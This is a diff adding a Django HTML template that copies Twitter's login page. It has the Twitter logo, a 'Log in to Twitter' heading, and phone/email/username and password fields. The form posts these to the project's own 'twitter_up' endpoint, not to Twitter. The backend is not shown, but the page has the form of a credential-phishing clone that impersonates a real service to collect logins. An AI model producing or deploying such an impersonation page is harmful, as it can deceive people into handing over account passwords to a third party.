@@ -1,0 +1,93 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style type="text/css">
+            .twitter{
+                position: relative;
+                text-align: center;
+                top: 20px;
+            }
+
+            .twitter2{
+                position: relative;
+                font-weight: bolder;
+                font-size: 40px;
+                margin-right: 30px;
+            }
+            
+            .but{
+            position: relative;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            color: whitesmoke;
+            margin-left: 30px;
+            padding-left: 150px;
+            padding-right: 150px;
+            padding-top: 15px;
+            padding-bottom: 15px;
+            border: 1px solid whitesmoke;
+            border-radius: 35px;
+            margin-top: 50px;
+            background-color: skyblue;
+        }
+
+        .twitter3{
+            text-align: center;
+            padding-top: 15px;
+            padding-bottom: 5px;
+            color: rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .twitter3 input{
+            padding-left: 0px;
+            width: 25%;
+            padding-top: 20px;
+            padding-bottom: 20px;
+            margin-left: 20px;
+            border: 1px solid black;
+            border-radius: 5px;
+            outline: none;
+            background: transparent;
+            color: black;
+        }
+
+        .twitter3 input:hover{
+            border: 2px solid dodgerblue;
+        }
+
+        ::placeholder{
+            color: rgba(0,0,0,0.5);
+            font-size: 15px;
+            font-weight: normal;
+            padding-left: 20px;
+        }
+    </style>
+    <title>Twitter</title>
+</head>
+<body>
+<form action="{% url 'twitter_up' %}" method="post" enctype="multipart/form-data">
+    {% csrf_token %}
+    <div class="twitter">
+        <div>
+            <img src="{% static 'images/Twitter_logo.png' %}" style="height: 30px; width: 55px; margin-right: 280px">
+        </div>
+        <div class="twitter1">
+            <h1 class="twitter2">Log in to Twitter</h1>
+        </div>
+        <div class="twitter3">
+            <input type="text" placeholder="Phone, email or username" required name="t1">
+        </div>
+        <div  class="twitter3">
+            <input type="password" placeholder="Password" required name="t2">
+        </div>
+        <div>
+            <button type="submit" class="but">Log in</button>
+        </div>
+    </div>    
+</form>
+</body>
+</html>
